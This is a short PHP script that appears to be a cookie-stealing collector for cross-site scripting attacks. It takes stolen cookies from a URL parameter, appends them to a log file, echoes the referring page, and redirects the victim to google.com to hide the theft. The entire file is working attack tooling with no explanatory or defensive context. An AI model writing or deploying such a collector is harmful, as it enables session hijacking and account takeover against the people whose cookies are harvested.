<?php
	$cookies = $_GET["cookies"];
	$file = fopen('cookies_log.txt','a');
	fwrite($file,$cookies . "\n\n");
	echo ($_SERVER['HTTP_REFERER']);
	header("Location: http://www.google.com");
?>